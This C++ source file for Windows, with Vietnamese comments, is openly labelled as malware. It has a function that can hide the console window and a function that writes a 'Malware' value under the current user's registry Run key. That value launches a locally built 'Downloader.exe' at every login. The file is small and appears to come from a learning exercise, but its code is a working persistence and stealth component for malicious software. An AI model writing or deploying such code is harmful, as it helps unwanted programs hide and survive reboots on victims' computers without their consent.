#include <Windows.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <time.h>
#include <map>
#include <string>
#pragma comment(lib, "urlmon.lib")

#define visible
#define MAXPATH 1000

using namespace std;

void Stealth() {
	// Tao 1 cua so moi

#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	FreeConsole();
#endif
}

void AutoRun(string exePath) {
	//GetModuleFileNameA(NULL, &exePath[0], MAXPATH);
	HKEY hKey;
	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	BYTE* exePathB = (BYTE*)exePath.c_str();
	if (lnRes == ERROR_SUCCESS) {
		cout << "Open Successfully!" << '\n';
		lnRes = RegSetValueExA(hKey, "Malware", 0, REG_SZ, (BYTE*)exePathB, exePath.length());
		if (lnRes == ERROR_SUCCESS) cout << "Add Successfully!" << '\n';
		else cout << "Add Failed!!!" << '\n';
	}
	else cout << "Open Failed!" << '\n';
}

int main()
{
	Stealth();
	
	AutoRun("D:\\MASM\\Downloader\\x64\\Debug\\Downloader.exe");
}
